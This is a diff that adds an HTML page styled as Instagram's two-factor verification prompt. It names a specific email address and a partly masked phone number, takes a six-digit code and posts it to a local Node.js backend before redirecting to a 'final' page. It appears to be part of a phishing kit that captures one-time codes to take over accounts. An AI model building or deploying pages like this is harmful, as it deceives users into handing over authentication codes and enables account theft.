@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram 2FA</title>
+    <style>
+        /* Your existing CSS styles */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm10 5v8H6v-8h12z"/>
+            </svg>
+        </div>
+        <p>Please enter the 6-digit verification code from your authentication app. Also, the code has been sent to your email (@rmaaz419@gmail.com) and via SMS to your registered phone number (+92 32******00).</p>
+        <form id="otpForm">
+            <input type="text" id="securityCode" name="securityCode" placeholder="Security Code" maxlength="6" required>
+            <div id="errorMessage" class="error">Please enter exactly 6 digits.</div>
+            <button type="submit">Confirm</button>
+        </form>
+        <div class="trust">
+            <input type="checkbox" checked>
+            <div class="trust-text">
+                <label>Trust this device</label>
+                <span> We won't ask for a code next time</span>
+            </div>
+        </div>
+        <p class="backup">
+            If you're unable to receive a login code from an authentication app, you can use one of your <a href="#">backup codes</a>.
+        </p>
+    </div>
+
+    <script>
+        // JavaScript for validation and form submission
+        document.getElementById('otpForm').addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
+
+            const securityCode = document.getElementById('securityCode').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Validate the security code
+            if (securityCode.length !== 6 || !/^\d+$/.test(securityCode)) {
+                errorMessage.style.display = 'block'; // Show error message
+                return;
+            }
+
+            errorMessage.style.display = 'none'; // Hide error message
+
+            try {
+                // Send data to the Node.js backend
+                const response = await fetch('http://localhost:3000/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ securityCode }),
+                });
+
+                if (response.ok) {
+                    alert('OTP submitted successfully!');
+                    window.location.href = 'final.html'; // Redirect to the next page
+                } else {
+                    alert('Failed to submit OTP. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
